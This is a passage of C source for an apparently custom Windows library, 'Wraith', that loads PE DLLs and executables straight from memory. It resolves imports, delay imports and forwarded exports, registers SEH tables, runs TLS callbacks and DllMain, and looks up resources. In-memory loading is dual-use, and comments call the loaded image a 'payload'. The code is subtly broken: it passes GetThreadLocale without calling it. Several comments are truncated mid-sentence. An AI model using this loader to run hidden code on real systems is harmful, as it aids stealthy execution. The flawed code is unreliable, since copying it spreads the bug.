  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
  if (dir->Size == 0) {
  return WRAITH_OK;  /* no delay imports */
  }

  const struct wr_rt_ops *rt = ctx->rt_ops ? ctx->rt_ops
  : wr_rt_resolve(ctx);
  ctx->rt_ops = rt;

  wr_delay_descr *desc =
  (wr_delay_descr *)(ctx->image_base + dir->VirtualAddress);

  while (desc->rvaDLLName != 0) {
  if (!(desc->grAttrs & WRAITH_DELAY_ATTR_RVA)) {
  /* V1 (absolute VAs) - very rare, predates Win2000. We refuse
  * rather than risk patching wrong addresses. */
  return wr_ctx_fail(ctx, WRAITH_E_IMP_DELAY_BAD_DESCR,
  "V1 delay descriptor (VA layout) unsupported");
  }

  const char *dll_name = (const char *)(ctx->image_base + desc->rvaDLLName);

  wraith_foreign_module_t host = NULL;
  wraith_status_t rc = rt->load_library(ctx, dll_name, &host);
  if (rc != WRAITH_OK) {
  return rc;
  }

  /* Track for cleanup. */
  size_t newcap = ctx->imported_count + 1;
  wraith_foreign_module_t *grown =
  (wraith_foreign_module_t *)realloc(ctx->imported_modules,
  newcap * sizeof(*grown));
  bool *owned_grown =
  (bool *)realloc(ctx->imported_owned, newcap * sizeof(*owned_grown));
  if (!grown || !owned_grown) {
  free(grown);
  free(owned_grown);
  rt->free_library(ctx, host);
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "delay tracking realloc");
  }
  ctx->imported_modules  = grown;
  ctx->imported_owned  = owned_grown;
  ctx->imported_modules[ctx->imported_count] = host;
  ctx->imported_owned[ctx->imported_count]  = true;
  ctx->imported_count  = (uint32_t)newcap;

  /* Persist HMODULE in the slot the linker reserved. Some
  * __delayLoadHelper2 codegens dereference it. */
  if (desc->rvaHmod) {
  void **hmod_slot = (void **)(ctx->image_base + desc->rvaHmod);
  *hmod_slot = host;
  }

  /* Walk INT, write resolved addresses into IAT. */
  uint64_t *int_thunk =
  (uint64_t *)(ctx->image_base + desc->rvaINT);
  void  **iat_slot  =
  (void  **)(ctx->image_base + desc->rvaIAT);

  while (*int_thunk) {
  void *resolved = NULL;
  if (*int_thunk & IMAGE_ORDINAL_FLAG64_LOCAL) {
  uint16_t ord = (uint16_t)(*int_thunk & 0xffff);
  rc = rt->get_proc(ctx, host,
  (const char *)(uintptr_t)ord, &resolved);
  } else {
  PIMAGE_IMPORT_BY_NAME by_name =
  (PIMAGE_IMPORT_BY_NAME)(ctx->image_base + *int_thunk);
  rc = rt->get_proc(ctx, host, (const char *)by_name->Name,
  &resolved);
  }
  if (rc != WRAITH_OK || !resolved) {
  return rc != WRAITH_OK
  ? rc
  : wr_ctx_fail(ctx, WRAITH_E_IMP_PROC_NOT_FOUND,
  "delay-import resolution NULL");
  }
  *iat_slot = resolved;
  ++int_thunk;
  ++iat_slot;
  }

  ++desc;
  }

  return WRAITH_OK;
}


/* ==========================================================================
 * src/loader/loader_finalize.c
 * ========================================================================== */

#define align_up _wr_amalg_align_up__loader_finalize
/*
 * src/loader/loader_finalize.c
 *
 * Apply final per-section VirtualProtect after relocations + imports are
 * applied. Strict RW->RX hygiene: no PAGE_EXECUTE_READWRITE is ever
 * requested. Discardable sections are decommitted when they fully occupy
 * a page.
 */





#include <windows.h>

static size_t align_down(size_t v, size_t a) { return v & ~(a - 1); }
static size_t align_up(size_t v, size_t a)  { return (v + a - 1) & ~(a - 1); }

static uint32_t real_section_size(const wr_pe_section_header *s,
  const wr_pe_view *src)
{
  uint32_t size = s->SizeOfRawData;
  if (size == 0) {
  if (s->Characteristics & WRAITH_PE_SCN_CNT_INITIALIZED_DATA) {
  size = src->nt->OptionalHeader.SizeOfInitializedData;
  } else if (s->Characteristics & WRAITH_PE_SCN_CNT_UNINITIALIZED) {
  size = src->nt->OptionalHeader.SizeOfUninitializedData;
  }
  }
  return size;
}

wraith_status_t wr_load_finalize_sections(struct wr_ctx *ctx,
  const wr_pe_view *src)
{
  if (!ctx || !src || !ctx->map_ops) {
  return WRAITH_E_NULL_ARG;
  }
  if (!wr_looks_like_valid_base(ctx->image_base)) {
  return wr_ctx_fail(ctx, WRAITH_E_INVALID_HANDLE,
  "finalize: invalid image_base=%p",
  (void *)ctx->image_base);
  }

  size_t page = ctx->page_size;
  if (page == 0) {
  page = 4096;
  }

  /* Walk sections and merge protections per page. */
  struct {
  void  *addr;
  size_t  size;
  uint32_t characteristics;
  } region;

  wr_pe_section_iter it;
  wr_pe_section_iter_init(&it, src);
  const wr_pe_section_header *s = wr_pe_section_iter_next(&it);
  if (!s) {
  return WRAITH_OK;
  }

  region.addr  = ctx->image_base + s->VirtualAddress;
  region.size  = real_section_size(s, src);
  region.characteristics = s->Characteristics;

  while ((s = wr_pe_section_iter_next(&it)) != NULL) {
  void  *sec_addr  = ctx->image_base + s->VirtualAddress;
  size_t sec_size  = real_section_size(s, src);
  size_t aligned  = align_down((size_t)sec_addr, page);
  size_t cur_align = align_down((size_t)region.addr, page);

  if (cur_align == aligned ||
  (size_t)region.addr + region.size > (size_t)sec_addr) {
  /* Same page as previous - merge. */
  region.size = ((size_t)sec_addr + sec_size) - (size_t)region.addr;
  region.characteristics |= s->Characteristics;
  continue;
  }

  /* Flush the prior region, then start a new one. */
  if (region.size > 0) {
  wraith_prot_t prot = wr_prot_from_section_chars(region.characteristics);
  wraith_status_t rc = ctx->map_ops->protect(ctx, region.addr,
  align_up(region.size, page),
  prot);
  if (rc != WRAITH_OK) {
  return rc;
  }
  }

  region.addr  = sec_addr;
  region.size  = sec_size;
  region.characteristics = s->Characteristics;
  }

  if (region.size > 0) {
  wraith_prot_t prot = wr_prot_from_section_chars(region.characteristics);
  return ctx->map_ops->protect(ctx, region.addr,
  align_up(region.size, page), prot);
  }
  return WRAITH_OK;
}

#undef align_up


/* ==========================================================================
 * src/loader/loader_seh_x64.c
 * ========================================================================== */

/*
 * src/loader/loader_seh_x64.c
 *
 * x64 structured-exception-handling registration.
 *
 * Background: on Windows x64 the unwinder (RtlUnwindEx) walks per-module
 * tables of `RUNTIME_FUNCTION` entries to know how to unwind a frame.
 * For PE images these entries live in `IMAGE_DIRECTORY_ENTRY_EXCEPTION`
 * (the .pdata section). The OS loader registers them automatically; a
 * memory-loaded image must register them itself via `RtlAddFunctionTable`,
 * otherwise any `__try`/`__except` (or any C++ exception, or any access
 * violation that would normally be handled) inside the loaded code
 * crashes the process with EXCEPTION_NONCONTINUABLE.
 *
 * shipped a no-op stub here. turns it on by default
 * (gated by WRAITH_REGISTER_SEH_X64, ON in every profile).
 *
 * Cleanup: ctx->runtime_funcs / functbl_registered are honored by
 * wr_load_unregister_seh_x64, called from wr_pipeline_unwind.
 */


#include <windows.h>

wraith_status_t wr_load_register_seh_x64(struct wr_ctx *ctx)
{
#if WRAITH_REGISTER_SEH_X64
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }

  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

  /* Empty .pdata is legal: pure-asm or stub DLLs may emit nothing.
  * In that case there's nothing to register and SEH isn't needed -
  * silently succeed. */
  if (dir->Size == 0 || dir->VirtualAddress == 0) {
  return WRAITH_OK;
  }

  /* RUNTIME_FUNCTION entries are RVAs relative to the image base; they
  * stay valid for the lifetime of the loaded image. We point at the
  * in-image table directly - no copy needed. */
  PRUNTIME_FUNCTION table =
  (PRUNTIME_FUNCTION)(ctx->image_base + dir->VirtualAddress);
  DWORD count = dir->Size / (DWORD)sizeof(RUNTIME_FUNCTION);

  if (count == 0) {
  return WRAITH_OK;
  }

  if (!RtlAddFunctionTable(table, count, (DWORD64)(uintptr_t)ctx->image_base)) {
  return wr_ctx_fail(ctx, WRAITH_E_SEH_REGISTER_FAILED,
  "RtlAddFunctionTable(%lu entries) returned FALSE: 0x%08lx",
  (unsigned long)count,
  (unsigned long)GetLastError());
  }

  ctx->runtime_funcs  = table;
  ctx->runtime_funcs_count = count;
  ctx->functbl_registered  = 1;
  return WRAITH_OK;
#else
  (void)ctx;
  return WRAITH_OK;
#endif
}

void wr_load_unregister_seh_x64(struct wr_ctx *ctx)
{
#if WRAITH_REGISTER_SEH_X64
  if (!ctx || !ctx->functbl_registered || !ctx->runtime_funcs) {
  return;
  }
  /* Best-effort: if the table no longer exists (e.g. the user module
  * already unmapped under us) the call returns FALSE and we ignore
  * it - we're tearing down anyway. */
  RtlDeleteFunctionTable((PRUNTIME_FUNCTION)ctx->runtime_funcs);
  ctx->functbl_registered  = 0;
  ctx->runtime_funcs  = NULL;
  ctx->runtime_funcs_count = 0;
#else
  (void)ctx;
#endif
}


/* ==========================================================================
 * src/loader/loader_tls.c
 * ========================================================================== */

/*
 * src/loader/loader_tls.c
 *
 * Walk IMAGE_DIRECTORY_ENTRY_TLS and run callbacks. only invokes
 * the ATTACH callbacks - DETACH/THREAD lifecycle lands in */


#include <windows.h>

wraith_status_t wr_load_run_tls_attach(struct wr_ctx *ctx,
  const wr_pe_view *src)
{
  (void)src;
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }

  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  if (dir->VirtualAddress == 0) {
  return WRAITH_OK;  /* no TLS data */
  }

  PIMAGE_TLS_DIRECTORY64 tls =
  (PIMAGE_TLS_DIRECTORY64)(ctx->image_base + dir->VirtualAddress);

  PIMAGE_TLS_CALLBACK *cb = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
  if (!cb) {
  return WRAITH_OK;
  }
  while (*cb) {
  (*cb)((LPVOID)ctx->image_base, DLL_PROCESS_ATTACH, NULL);
  ++cb;
  }
  ctx->tls_attach_ran = true;
  return WRAITH_OK;
}

void wr_load_run_tls_detach(struct wr_ctx *ctx)
{
  /* Only fire DETACH when ATTACH actually ran. The pipeline calls this
  * from wr_pipeline_unwind on every failure path - including failures
  * before phase 14 (tls_attach) ever ran. Without this guard, a failure
  * at phase 9 (imports) would invoke the payload's TLS callbacks on a
  * .text that finalize never flipped to RX, faulting with
  * ExceptionAddress == FaultAddress at the callback's RVA. */
  if (!ctx || !ctx->headers || !ctx->tls_attach_ran) {
  return;
  }
  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  if (dir->VirtualAddress == 0) {
  return;
  }
  PIMAGE_TLS_DIRECTORY64 tls =
  (PIMAGE_TLS_DIRECTORY64)(ctx->image_base + dir->VirtualAddress);
  PIMAGE_TLS_CALLBACK *cb = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
  if (!cb) {
  return;
  }
  while (*cb) {
  (*cb)((LPVOID)ctx->image_base, DLL_PROCESS_DETACH, NULL);
  ++cb;
  }
}


/* ==========================================================================
 * src/loader/loader_entry.c
 * ========================================================================== */

/*
 * src/loader/loader_entry.c
 *
 * Invoke DllMain for DLL images, or stash the entry point address for
 * EXE images so the consumer can call wraith_call_entry_point later.
 */


#include <windows.h>

typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE, DWORD, LPVOID);

wraith_status_t wr_load_run_entry(struct wr_ctx *ctx)
{
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }

  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  DWORD aoep = nt->OptionalHeader.AddressOfEntryPoint;

  if (aoep == 0) {
  ctx->dll_entry  = NULL;
  ctx->exe_entry  = NULL;
  return WRAITH_OK;
  }

  void *entry = ctx->image_base + aoep;

  if (ctx->image_type == WRAITH_IMAGE_DLL) {
  DllEntryProc dll = (DllEntryProc)(LPVOID)entry;
  ctx->dll_entry = (void *)dll;
  BOOL ok = dll((HINSTANCE)ctx->image_base, DLL_PROCESS_ATTACH, NULL);
  if (!ok) {
  return wr_ctx_fail(ctx, WRAITH_E_RT_DLLMAIN_FAILED,
  "DllMain returned FALSE");
  }
  ctx->initialized = 1;
  } else {
  ctx->exe_entry = entry;
  }
  return WRAITH_OK;
}

void wr_load_run_entry_detach(struct wr_ctx *ctx)
{
  if (!ctx || !ctx->initialized || !ctx->dll_entry) {
  return;
  }
  DllEntryProc dll = (DllEntryProc)ctx->dll_entry;
  dll((HINSTANCE)ctx->image_base, DLL_PROCESS_DETACH, NULL);
}


/* ==========================================================================
 * src/loader/loader_api.c
 * ========================================================================== */

/*
 * src/loader/loader_api.c
 *
 * Public v2 entry points: wraith_load_library, wraith_get_proc_address,
 * wraith_free_library, wraith_call_entry_point. These are thin glue between the
 * caller and the internal pipeline / lookup helpers.
 */




#include <windows.h>

wraith_status_t wraith_load_library(const void *buffer, size_t size,
  const wraith_load_options *options,
  wraith_handle_t *out)
{
  if (!out) {
  return WRAITH_E_NULL_ARG;
  }
  *out = NULL;

  if (!buffer || size == 0) {
  return WRAITH_E_NULL_ARG;
  }

  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_create(options, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }

  rc = wr_pipeline_run(buffer, size, ctx);
  if (rc != WRAITH_OK) {
  wr_pipeline_unwind(ctx);
  wr_ctx_destroy(ctx);
  return rc;
  }

  *out = (wraith_handle_t)ctx;
  return WRAITH_OK;
}

wraith_status_t wraith_get_proc_address(wraith_handle_t h, const char *name,
  void **out_proc)
{
  if (!out_proc) {
  return WRAITH_E_NULL_ARG;
  }
  *out_proc = NULL;

  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  return wr_export_resolve(ctx, name, out_proc);
}

wraith_status_t wraith_call_entry_point(wraith_handle_t h, int *out_exit_code)
{
  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  if (!ctx->exe_entry || ctx->image_type != WRAITH_IMAGE_EXE ||
  !ctx->is_relocated) {
  return WRAITH_E_INVALID_HANDLE;
  }

  typedef int (WINAPI *exe_entry_fn)(void);
  int code = ((exe_entry_fn)ctx->exe_entry)();
  if (out_exit_code) {
  *out_exit_code = code;
  }
  ctx->entry_called = 1;
  return WRAITH_OK;
}

wraith_status_t wraith_free_library(wraith_handle_t h)
{
  if (!h) {
  return WRAITH_OK;
  }
  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  wr_pipeline_unwind(ctx);
  wr_ctx_destroy(ctx);
  return WRAITH_OK;
}

/* -------------------------------------------------------------------------
 * Introspection
 * ------------------------------------------------------------------------- */

wraith_status_t wraith_get_image_base(wraith_handle_t h, void **out_base, size_t *out_size)
{
  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  if (out_base) *out_base = ctx->image_base;
  if (out_size) *out_size = ctx->image_size;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/exports/export_lookup.c
 * ========================================================================== */

/*
 * src/exports/export_lookup.c
 *
 * Name + ordinal export resolution. Binary-search over the sorted
 * export-name array; returns rich wraith_status_t error codes.
 *
 * Forwarded exports (export RVA points back into the export-table
 * range, encoding "DLL.Func") are followed by `export_forward.c`.
 */


#include <stdlib.h>
#include <string.h>
#include <windows.h>

static int compare_entries(const void *a, const void *b)
{
  const wr_export_entry *ea = (const wr_export_entry *)a;
  const wr_export_entry *eb = (const wr_export_entry *)b;
  return strcmp(ea->name, eb->name);
}

static int find_entry(const void *key, const void *elem)
{
  const char *name = *(const char *const *)key;
  const wr_export_entry *e = (const wr_export_entry *)elem;
  return strcmp(name, e->name);
}

static wraith_status_t build_name_table(struct wr_ctx *ctx,
  PIMAGE_EXPORT_DIRECTORY exports)
{
  if (ctx->export_table) {
  return WRAITH_OK;
  }
  if (exports->NumberOfNames == 0) {
  return WRAITH_OK;
  }

  wr_export_entry *table =
  (wr_export_entry *)calloc(exports->NumberOfNames,
  sizeof(wr_export_entry));
  if (!table) {
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "export table alloc");
  }

  DWORD *name_rvas = (DWORD *)(ctx->image_base + exports->AddressOfNames);
  WORD  *ord_rvas  = (WORD  *)(ctx->image_base + exports->AddressOfNameOrdinals);
  for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
  table[i].name  = (const char *)(ctx->image_base + name_rvas[i]);
  table[i].ordinal = ord_rvas[i];
  }
  qsort(table, exports->NumberOfNames, sizeof(wr_export_entry),
  compare_entries);

  ctx->export_table = table;
  ctx->export_count = exports->NumberOfNames;
  return WRAITH_OK;
}

wraith_status_t wr_export_resolve(struct wr_ctx *ctx, const char *name_or_ord,
  void **out_proc)
{
  if (!ctx || !out_proc) {
  return WRAITH_E_NULL_ARG;
  }
  *out_proc = NULL;

  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (dir->Size == 0) {
  return wr_ctx_fail(ctx, WRAITH_E_EXP_NO_TABLE,
  "image has no export table");
  }

  PIMAGE_EXPORT_DIRECTORY exports =
  (PIMAGE_EXPORT_DIRECTORY)(ctx->image_base + dir->VirtualAddress);
  if (exports->NumberOfFunctions == 0) {
  return wr_ctx_fail(ctx, WRAITH_E_EXP_NOT_FOUND,
  "image exports zero functions");
  }

  DWORD idx = 0;

  /* HIWORD == 0 -> caller passed an ordinal cast to (const char *). */
  if (((uintptr_t)name_or_ord >> 16) == 0) {
  WORD ord = (WORD)(uintptr_t)name_or_ord;
  if (ord < exports->Base) {
  return wr_ctx_fail(ctx, WRAITH_E_EXP_BAD_ORDINAL,
  "ordinal %u below Base %lu",
  (unsigned)ord, (unsigned long)exports->Base);
  }
  idx = ord - exports->Base;
  } else {
  wraith_status_t rc = build_name_table(ctx, exports);
  if (rc != WRAITH_OK) {
  return rc;
  }
  const char *needle = name_or_ord;
  const wr_export_entry *found =
  (const wr_export_entry *)bsearch(&needle, ctx->export_table,
  ctx->export_count,
  sizeof(wr_export_entry),
  find_entry);
  if (!found) {
  return wr_ctx_fail(ctx, WRAITH_E_EXP_NOT_FOUND,
  "export \"%s\" not found", needle);
  }
  idx = found->ordinal;
  }

  if (idx >= exports->NumberOfFunctions) {
  return wr_ctx_fail(ctx, WRAITH_E_EXP_BAD_ORDINAL,
  "ordinal index %lu out of range",
  (unsigned long)idx);
  }

  DWORD *funcs = (DWORD *)(ctx->image_base + exports->AddressOfFunctions);
  DWORD func_rva = funcs[idx];
  if (func_rva == 0) {
  return wr_ctx_fail(ctx, WRAITH_E_EXP_NOT_FOUND,
  "export at ordinal index %lu is NULL", (unsigned long)idx);
  }

  void *candidate = (void *)(ctx->image_base + func_rva);

#if WRAITH_FORWARDED_EXPORTS
  /* Forwarder detection: a forwarded export's RVA points back inside
  * the export directory itself ("kernel32.Sleep"). Resolve through
  * the runtime vtable and return the concrete address. */
  if (wr_export_is_forwarder(ctx, candidate)) {
  const char *forward_str = (const char *)candidate;
  void *resolved = NULL;
  wraith_status_t rc = wr_export_resolve_forwarder(ctx, forward_str, &resolved);
  if (rc != WRAITH_OK) {
  return rc;
  }
  *out_proc = resolved;
  return WRAITH_OK;
  }
#endif

  *out_proc = candidate;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/exports/export_forward.c
 * ========================================================================== */

/*
 * src/exports/export_forward.c
 *
 * Implementation of the forwarder resolver.
 *
 * Forwarder string syntax (per the PE spec):
 *  "<DLL>.<Func>"  - resolve Func by name in DLL
 *  "<DLL>.#<digits>"  - resolve by ordinal in DLL
 *
 * The DLL filename in the string is short (no .dll extension). We append
 * ".dll" before passing it to the runtime so LoadLibraryA / PEB-walk
 * resolvers see a canonical name.
 */


#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define WRAITH_FORWARD_MAX_DEPTH  16

bool wr_export_is_forwarder(struct wr_ctx *ctx, void *proc)
{
  if (!ctx || !proc || !ctx->headers) {
  return false;
  }
  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (dir->Size == 0) {
  return false;
  }
  uintptr_t lo = (uintptr_t)(ctx->image_base + dir->VirtualAddress);
  uintptr_t hi = lo + dir->Size;
  uintptr_t p  = (uintptr_t)proc;
  return p >= lo && p < hi;
}

wraith_status_t wr_export_resolve_forwarder(struct wr_ctx *ctx,
  const char *forward_str,
  void **out_proc)
{
  if (!ctx || !forward_str || !out_proc) {
  return WRAITH_E_NULL_ARG;
  }
  *out_proc = NULL;

  /* Split "DLL.Func" on the first '.'. The DLL portion never contains
  * a dot itself in practice (Microsoft uses "kernel32", "ntdll",
  * etc.) so we keep this simple. */
  const char *dot = strchr(forward_str, '.');
  if (!dot || dot == forward_str || dot[1] == '\0') {
  return wr_ctx_fail(ctx, WRAITH_E_IMP_FORWARDER_LOOP,
  "malformed forwarder \"%s\"", forward_str);
  }

  size_t dll_len = (size_t)(dot - forward_str);
  if (dll_len > 64) {
  /* Unusually long DLL name - reject rather than overflow stack. */
  return wr_ctx_fail(ctx, WRAITH_E_IMP_FORWARDER_LOOP,
  "forwarder DLL name too long");
  }
  char dll_buf[80];
  memcpy(dll_buf, forward_str, dll_len);
  /* Append .dll if not already present. */
  static const char ext[] = ".dll";
  memcpy(dll_buf + dll_len, ext, sizeof(ext));

  const char *func_part = dot + 1;

  const struct wr_rt_ops *rt = ctx->rt_ops ? ctx->rt_ops
  : wr_rt_resolve(ctx);
  ctx->rt_ops = rt;

  wraith_foreign_module_t host = NULL;
  wraith_status_t rc = rt->load_library(ctx, dll_buf, &host);
  if (rc != WRAITH_OK) {
  return rc;
  }

  /* "#NNN" -> ordinal lookup. */
  void *resolved = NULL;
  if (func_part[0] == '#') {
  unsigned long ord = strtoul(func_part + 1, NULL, 10);
  rc = rt->get_proc(ctx, host, (const char *)(uintptr_t)ord, &resolved);
  } else {
  rc = rt->get_proc(ctx, host, func_part, &resolved);
  }
  if (rc != WRAITH_OK) {
  rt->free_library(ctx, host);
  return rc;
  }

  /* Track the forwarder host so wraith_free_library decrements its refcount. */
  size_t newcap = ctx->imported_count + 1;
  wraith_foreign_module_t *grown =
  (wraith_foreign_module_t *)realloc(ctx->imported_modules,
  newcap * sizeof(*grown));
  bool *owned_grown =
  (bool *)realloc(ctx->imported_owned, newcap * sizeof(*owned_grown));
  if (!grown || !owned_grown) {
  free(grown);
  free(owned_grown);
  rt->free_library(ctx, host);
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "forwarder tracking realloc");
  }
  ctx->imported_modules  = grown;
  ctx->imported_owned  = owned_grown;
  ctx->imported_modules[ctx->imported_count] = host;
  ctx->imported_owned[ctx->imported_count]  = true;
  ctx->imported_count  = (uint32_t)newcap;

  *out_proc = resolved;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/resource/resource_find.c
 * ========================================================================== */

/*
 * src/resource/resource_find.c
 *
 * Three-level resource directory walk: type -> name -> language.
 * Returns wraith_status_t at the public API edge.
 */


#include <string.h>
#include <wchar.h>
#include <windows.h>

static PIMAGE_RESOURCE_DIRECTORY_ENTRY
search_entry(void *root, PIMAGE_RESOURCE_DIRECTORY dir, const void *key)
{
  PIMAGE_RESOURCE_DIRECTORY_ENTRY entries =
  (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(dir + 1);

  if (((uintptr_t)key >> 16) == 0) {
  WORD wkey = (WORD)(uintptr_t)key;
  DWORD start = dir->NumberOfNamedEntries;
  DWORD end  = start + dir->NumberOfIdEntries;
  while (end > start) {
  DWORD mid = (start + end) >> 1;
  WORD entry_key = (WORD)entries[mid].Name;
  if (wkey < entry_key) {
  end = (end != mid ? mid : mid - 1);
  } else if (wkey > entry_key) {
  start = (start != mid ? mid : mid + 1);
  } else {
  return &entries[mid];
  }
  }
  return NULL;
  }

  /* Named entry. Resource names are stored as wide strings; we accept
  * input as ASCII or wide and convert if needed. The vast majority of
  * real-world consumers pass MAKEINTRESOURCE(id) (handled above), so
  * this slow path is acceptable. */
  const char *as_ansi = (const char *)key;
  size_t needle_chars = 0;
  wchar_t needle_buf[2048];
  {
  size_t n = mbstowcs(needle_buf, as_ansi,
  sizeof(needle_buf) / sizeof(needle_buf[0]) - 1);
  if (n == (size_t)-1) {
  return NULL;
  }
  needle_buf[n] = 0;
  needle_chars  = n;
  }

  DWORD start = 0;
  DWORD end  = dir->NumberOfNamedEntries;
  while (end > start) {
  DWORD mid = (start + end) >> 1;
  PIMAGE_RESOURCE_DIR_STRING_U s =
  (PIMAGE_RESOURCE_DIR_STRING_U)
  ((uint8_t *)root + (entries[mid].Name & 0x7fffffff));
  int cmp = _wcsnicmp(needle_buf, s->NameString, s->Length);
  if (cmp == 0) {
  if (needle_chars > s->Length) cmp =  1;
  else if (needle_chars < s->Length) cmp = -1;
  }
  if (cmp < 0) {
  end  = (mid != end ? mid : mid - 1);
  } else if (cmp > 0) {
  start = (mid != start ? mid : mid + 1);
  } else {
  return &entries[mid];
  }
  }
  return NULL;
}

PIMAGE_RESOURCE_DATA_ENTRY wr_resource_find_entry(struct wr_ctx *ctx,
  const void *name,
  const void *type,
  uint16_t language)
{
  if (!ctx || !ctx->headers) {
  return NULL;
  }

  PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)ctx->headers;
  PIMAGE_DATA_DIRECTORY dir =
  &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
  if (dir->Size == 0) {
  return NULL;
  }

  if (language == WRAITH_LANG_DEFAULT) {
  language = LANGIDFROMLCID(GetThreadLocale);
  }

  PIMAGE_RESOURCE_DIRECTORY root =
  (PIMAGE_RESOURCE_DIRECTORY)(ctx->image_base + dir->VirtualAddress);

  PIMAGE_RESOURCE_DIRECTORY_ENTRY found_type =
  search_entry(root, root, type);
  if (!found_type) {
  return NULL;
  }
  PIMAGE_RESOURCE_DIRECTORY type_dir =
  (PIMAGE_RESOURCE_DIRECTORY)
  (ctx->image_base + dir->VirtualAddress +
  (found_type->OffsetToData & 0x7fffffff));

  PIMAGE_RESOURCE_DIRECTORY_ENTRY found_name =
  search_entry(root, type_dir, name);
  if (!found_name) {
  return NULL;
  }
  PIMAGE_RESOURCE_DIRECTORY name_dir =
  (PIMAGE_RESOURCE_DIRECTORY)
  (ctx->image_base + dir->VirtualAddress +
  (found_name->OffsetToData & 0x7fffffff));

  PIMAGE_RESOURCE_DIRECTORY_ENTRY found_lang =
  search_entry(root, name_dir,
  (const void *)(uintptr_t)language);
  if (!found_lang) {
  if (name_dir->NumberOfIdEntries == 0) {
  return NULL;
  }
  found_lang = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(name_dir + 1);
  }

  return (PIMAGE_RESOURCE_DATA_ENTRY)
  (ctx->image_base + dir->VirtualAddress +
  (found_lang->OffsetToData & 0x7fffffff));
}

wraith_status_t wraith_find_resource(wraith_handle_t h, const void *name, const void *type,
  uint16_t language, wraith_resource_t *out)
{
  if (!out) {
  return WRAITH_E_NULL_ARG;
  }
  *out = NULL;
  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  PIMAGE_RESOURCE_DATA_ENTRY entry =
  wr_resource_find_entry(ctx, name, type, language);
  if (!entry) {
  return WRAITH_E_RES_NOT_FOUND;
  }
  *out = (wraith_resource_t)entry;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/resource/resource_load.c
 * ========================================================================== */

/*
 * src/resource/resource_load.c
 *
 * wraith_sizeof_resource + wraith_load_resource_data. Trivial readers off the
 * resource entry produced by wraith_find_resource.
 */


#include <windows.h>

wraith_status_t wraith_sizeof_resource(wraith_handle_t h, wraith_resource_t r,
  size_t *out_size)
{
  if (!out_size) {
  return WRAITH_E_NULL_ARG;
  }
  *out_size = 0;
  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  PIMAGE_RESOURCE_DATA_ENTRY entry = (PIMAGE_RESOURCE_DATA_ENTRY)r;
  if (!entry) {
  return WRAITH_E_RES_NOT_FOUND;
  }
  *out_size = entry->Size;
  return WRAITH_OK;
}

wraith_status_t wraith_load_resource_data(wraith_handle_t h, wraith_resource_t r,
  const void **out_data)
{
  if (!out_data) {
  return WRAITH_E_NULL_ARG;
  }
  *out_data = NULL;
  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }
  PIMAGE_RESOURCE_DATA_ENTRY entry = (PIMAGE_RESOURCE_DATA_ENTRY)r;
  if (!entry) {
  return WRAITH_E_RES_NOT_FOUND;
  }
  *out_data = ctx->image_base + entry->OffsetToData;
  return WRAITH_OK;
}


/* ==========================================================================
 * src/resource/resource_string.c
 * ========================================================================== */

/*
 * src/resource/resource_string.c
 *
 * wraith_load_string - looks up an ID in RT_STRING and copies (up to
 * `buf_chars`) wide characters into `out_buffer`.
 */


#include <wchar.h>
#include <windows.h>

